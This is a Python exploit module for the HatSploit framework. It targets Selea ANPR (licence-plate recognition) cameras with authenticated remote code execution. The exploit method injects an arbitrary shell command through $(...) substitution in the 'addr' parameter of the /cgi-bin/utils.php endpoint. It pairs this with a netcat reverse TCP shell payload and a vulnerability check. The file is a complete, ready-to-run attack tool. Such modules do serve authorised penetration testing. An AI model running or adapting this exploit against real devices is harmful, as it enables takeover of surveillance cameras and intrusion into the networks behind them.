"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler
from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP


class HatSploitModule(Module, Handler, HTTP):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Selea ANPR Camera Authenticated RCE",
            'Module': "exploit/linux/selea/anpr_authenticated_rce",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'LiquidWorm (liquidworm) - vulnerability researcher',
            ],
            'Description': "Selea ANPR Camera authenticated remote code execution.",
            'Platform': "linux",
            'Rank': "high",
            'Payload': {
                'Value': "unix/generic/netcat_reverse_tcp",
                'Architectures': ['armle', 'generic'],
                'Platforms': ['linux', 'unix'],
            }
        }

        self.username = Option(None, "Username for authentication.", True)
        self.password = Option(None, "Password for authentication.", True)

    def exploit(self, command):
        self.http_request(
            method="GET",
            path=f'/cgi-bin/utils.php?cmd=addr_check&addr=1.3.3.7\\ $({command})&type=port&port=80',
            auth=(self.username.value, self.password.value),
            output=False,
        )

    def check(self):
        response = self.http_request(
            method="GET",
            path=f'/cgi-bin/utils.php?cmd=addr_check&addr=1.3.3.7\\ $(echo)&type=port&port=80',
            auth=(self.username.value, self.password.value),
            output=False,
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        self.module_handle(
            sender=self.exploit,
        )
